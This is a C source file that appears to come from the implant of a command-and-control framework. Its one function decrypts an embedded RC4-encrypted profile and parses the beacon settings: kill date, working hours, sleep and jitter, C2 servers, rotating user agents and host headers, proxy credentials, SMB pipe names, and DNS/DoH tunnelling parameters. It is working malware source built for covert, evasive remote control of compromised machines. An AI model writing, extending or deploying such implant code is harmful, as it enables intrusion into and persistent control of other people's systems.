#include "AgentConfig.h"
#include "Packer.h"
#include "Crypt.h"
#include "utils.h"
#include "config.h"

AgentConfig* AgentConfig_Create()
{
	AgentConfig* self = (AgentConfig*)MemAllocLocal(sizeof(AgentConfig));

	ULONG length       = 0;
	ULONG size         = getProfileSize();
	CHAR* ProfileBytes = (CHAR*) MemAllocLocal(size);
	memcpy(ProfileBytes, getProfile(), size);

	Packer* packer = Packer_CreateWithBuffer((BYTE*)ProfileBytes, size);
	ULONG profileSize = Packer_Unpack32(packer);

	self->encrypt_key = (PBYTE) MemAllocLocal(16);
	memcpy(self->encrypt_key, Packer_data(packer) + 4 + profileSize, 16);

	DecryptRC4(Packer_data(packer)+4, profileSize, self->encrypt_key, 16);
	
	self->agent_type   = Packer_Unpack32(packer);
	self->kill_date    = Packer_Unpack32(packer);
	self->working_time = Packer_Unpack32(packer);
	self->sleep_delay  = Packer_Unpack32(packer);
	self->jitter_delay = Packer_Unpack32(packer);

#if defined(BEACON_HTTP) || defined(BEACON_WS)
	self->listener_type = Packer_Unpack32(packer);

	self->profile.use_ssl        = Packer_Unpack8(packer);
	self->profile.servers_count  = Packer_Unpack32(packer);
	self->profile.servers        = (BYTE**) MemAllocLocal(self->profile.servers_count * sizeof(LPVOID) );
	self->profile.ports          = (WORD*)  MemAllocLocal(self->profile.servers_count * sizeof(WORD) );
	for (int i = 0; i < self->profile.servers_count; i++) {
		self->profile.servers[i] = Packer_UnpackBytesCopy(packer, &length);
		self->profile.ports[i]   = (WORD) Packer_Unpack32(packer);
	}
	self->profile.http_method = Packer_UnpackBytesCopy(packer, &length);
	self->profile.uri_count   = Packer_Unpack32(packer);
	self->profile.uris        = (BYTE**)MemAllocLocal(self->profile.uri_count * sizeof(LPVOID));
	for (ULONG i = 0; i < self->profile.uri_count; i++) {
		self->profile.uris[i] = Packer_UnpackBytesCopy(packer, &length);
	}
	self->profile.parameter   = Packer_UnpackBytesCopy(packer, &length);
	self->profile.ua_count    = Packer_Unpack32(packer);
	self->profile.user_agents = (BYTE**)MemAllocLocal(self->profile.ua_count * sizeof(LPVOID));
	for (ULONG i = 0; i < self->profile.ua_count; i++) {
		self->profile.user_agents[i] = Packer_UnpackBytesCopy(packer, &length);
	}
	self->profile.http_headers = Packer_UnpackBytesCopy(packer, &length);
	self->profile.ans_pre_size = Packer_Unpack32(packer);
	self->profile.ans_size     = Packer_Unpack32(packer) + self->profile.ans_pre_size;
	self->profile.hh_count     = Packer_Unpack32(packer);
	self->profile.host_headers = (BYTE**)MemAllocLocal(self->profile.hh_count * sizeof(LPVOID));
	for (ULONG i = 0; i < self->profile.hh_count; i++) {
		self->profile.host_headers[i] = Packer_UnpackBytesCopy(packer, &length);
	}
	self->profile.rotation_mode  = (BYTE) Packer_Unpack32(packer);
	self->profile.proxy_type     = (BYTE) Packer_Unpack32(packer);
	self->profile.proxy_host     = Packer_UnpackBytesCopy(packer, &length);
	self->profile.proxy_port     = (WORD) Packer_Unpack32(packer);
	self->profile.proxy_username = Packer_UnpackBytesCopy(packer, &length);
	self->profile.proxy_password = Packer_UnpackBytesCopy(packer, &length);

#elif defined(BEACON_SMB)
	self->listener_type    = Packer_Unpack32(packer);
	self->profile.pipename = Packer_UnpackBytesCopy(packer, &length);

#elif defined(BEACON_TCP)
	self->listener_type   = Packer_Unpack32(packer);
	self->profile.prepend = Packer_UnpackBytesCopy(packer, &length);
	self->profile.port    = Packer_Unpack32(packer);

#elif defined(BEACON_DNS)
	self->listener_type         = Packer_Unpack32(packer);
	self->profile.domain        = Packer_UnpackBytesCopy(packer, &length);
	self->profile.resolvers     = Packer_UnpackBytesCopy(packer, &length);
	self->profile.doh_resolvers = Packer_UnpackBytesCopy(packer, &length);
	self->profile.qtype         = Packer_UnpackBytesCopy(packer, &length);
	self->profile.pkt_size      = Packer_Unpack32(packer);
	self->profile.label_size    = Packer_Unpack32(packer);
	self->profile.ttl           = Packer_Unpack32(packer);
	self->profile.encrypt_key   = self->encrypt_key;
	self->profile.burst_enabled = Packer_Unpack32(packer);
	self->profile.burst_sleep   = Packer_Unpack32(packer);
	self->profile.burst_jitter  = Packer_Unpack32(packer);
	self->profile.dns_mode      = Packer_Unpack32(packer);
	self->profile.user_agent    = Packer_UnpackBytesCopy(packer, &length);
#endif

	if (!Packer_UnpackFlatBytes(packer, self->transport_salt, 16))
		memset(self->transport_salt, 0, 16);

#if defined(BEACON_DNS)
	self->download_chunk_size = 0x8000; // 32 KB
#else
	self->download_chunk_size = 0x19000; // ~100KB 
#endif

	Packer_Destroy(packer);
	/* ProfileBytes was packer's buffer (Packer_CreateWithBuffer); Packer_Destroy already freed it. */

	return self;
}